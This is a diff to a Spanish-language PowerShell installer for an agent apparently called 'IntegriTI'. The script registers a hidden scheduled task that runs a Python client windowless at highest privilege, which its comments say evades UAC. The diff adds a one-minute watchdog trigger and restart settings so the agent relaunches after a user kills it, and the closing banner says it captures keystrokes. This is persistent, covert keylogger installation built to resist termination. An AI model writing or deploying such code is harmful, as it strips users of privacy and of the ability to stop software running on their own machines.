@@ -42,16 +42,16 @@ if (-not (Test-Path $NpcapPath)) {
     Write-Host "[!] Npcap no detectado. Descargando instalador oficial..." -ForegroundColor Yellow
     $NpcapUrl = "https://npcap.com/dist/npcap-1.79.exe"
     $InstallerPath = "$DirActual\npcap_installer.exe"
-    
+
     # Descargar el instalador
     Invoke-WebRequest -Uri $NpcapUrl -OutFile $InstallerPath
-    
+
     Write-Host "[!] ATENCION: Se abrira el instalador de Npcap. Por favor completa la instalacion manual." -ForegroundColor Yellow
     Write-Host "[!] Asegurate de marcar la opcion 'Install Npcap in WinPcap API-compatible Mode'." -ForegroundColor Yellow
-    
+
     # Lanzar instalador y esperar a que el usuario termine
     Start-Process -FilePath $InstallerPath -Wait
-    
+
     # Limpiar el ejecutable descargado
     Remove-Item -Path $InstallerPath -Force -ErrorAction SilentlyContinue
     Write-Host "[OK] Motor de red instalado." -ForegroundColor Green
@@ -76,25 +76,38 @@ Write-Host "[*] Configurando persistencia (Programador de Tareas)..." -Foregroun
 $TaskName = "Agente_IntegriTI_$UsuarioReal"
 $ScriptPython = "$DirActual\Client\client.py"
 # Usamos pythonw.exe para que no se abra ninguna ventana negra (silencioso)
-$PythonVenv = "$DirActual\venv\Scripts\pythonw.exe" 
+$PythonVenv = "$DirActual\venv\Scripts\pythonw.exe"
 
 # A) Definir la acción (Ejecutar el agente)
 $Action = New-ScheduledTaskAction -Execute $PythonVenv -Argument "`"$ScriptPython`"" -WorkingDirectory "$DirActual\Client"
 
-# B) Definir el gatillo (Al iniciar sesión este usuario)
-$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $UsuarioReal
+# B) Definir los gatillos:
+#    B1) Al iniciar sesión este usuario (arranque normal)
+$TriggerLogon = New-ScheduledTaskTrigger -AtLogOn -User $UsuarioReal
+
+#    B2) Watchdog: reintenta cada 1 minuto, indefinidamente. Si el proceso ya
+#        está corriendo, MultipleInstances=IgnoreNew hace que este disparo no
+#        haga nada; si el proceso fue matado (ej. Task Manager), lo relanza
+#        en el siguiente minuto sin intervención humana.
+$TriggerWatchdog = New-ScheduledTaskTrigger -Once -At (Get-Date) `
+    -RepetitionInterval (New-TimeSpan -Minutes 1) `
+    -RepetitionDuration (New-TimeSpan -Days 3650)
 
 # C) Definir los privilegios (RunLevel Highest = Evade UAC, no pide permisos y da acceso a root/admin)
 $Principal = New-ScheduledTaskPrincipal -UserId $UsuarioReal -LogonType Interactive -RunLevel Highest
 
-# D) Definir las configuraciones (Oculto, no detenerse si usa batería, reiniciar si falla)
-$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
+# D) Definir las configuraciones (Oculto, no detenerse si usa batería, reiniciar si falla,
+#    y NO permitir una segunda instancia en paralelo cuando el watchdog dispara mientras
+#    el agente ya está vivo)
+$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
+    -ExecutionTimeLimit 0 -MultipleInstances IgnoreNew -RestartCount 999 -RestartInterval (New-TimeSpan -Minutes 1)
 
 # Eliminar tarea anterior si existe
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
 
-# Registrar la nueva tarea
-Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null
+# Registrar la nueva tarea con AMBOS triggers (arranque + watchdog)
+Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($TriggerLogon, $TriggerWatchdog) `
+    -Principal $Principal -Settings $Settings -Force | Out-Null
 
 # Iniciar la tarea inmediatamente
 Start-ScheduledTask -TaskName $TaskName
@@ -102,5 +115,6 @@ Stop-Transcript
 Write-Host "[OK] Instalacion completada. Agente corriendo en segundo plano." -ForegroundColor Green
 Write-Host "=================================================="
 Write-Host " INSTALACION COMPLETADA CON EXITO."
-Write-Host " El agente evadira el UAC y capturara teclas en Windows."
+Write-Host " El agente evadira el UAC, capturara teclas en Windows,"
+Write-Host " y se reiniciara solo si el proceso es terminado manualmente."
 Write-Host "=================================================="
